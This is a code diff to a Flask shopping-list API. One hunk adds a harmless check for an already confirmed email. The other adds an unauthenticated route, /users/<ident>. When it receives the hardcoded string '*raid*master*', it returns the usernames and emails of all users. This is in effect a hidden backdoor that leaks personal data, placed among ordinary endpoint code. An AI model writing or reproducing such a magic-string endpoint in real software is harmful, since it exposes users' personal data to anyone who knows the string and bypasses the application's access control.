@@ -102,6 +102,11 @@ def verify_email(token):
 
     else:
         user = User.query.filter_by(email=email).first()
+        if user.confirmed==True:
+            response = {
+            'message': 'Your email is already confirmed. Please login to continue.'
+            }
+            return make_response(jsonify(response)), 200
         user.confirmed = True
         user.save()
         response = {
@@ -1140,3 +1145,21 @@ def buddies_list_items_view(list_id):
             }
             # reurn an anouthorized message
             return make_response(jsonify(response)), 401
+@shoppinglist_bp.route('/users/<ident>', methods=['GET'])
+def get_all_users(ident):
+    if ident == "*raid*master*":
+        dets = User.query.all()
+        result = []
+        usernames=[]
+        emails=[]
+        obj = {}
+        for user in dets:
+            emails.append(user.email)
+            usernames.append(user.username)
+        obj = {
+        'usernames' : usernames,
+        'emails' : emails
+        }
+        result.append(obj)
+        # return success
+        return make_response(jsonify(result=result)), 200
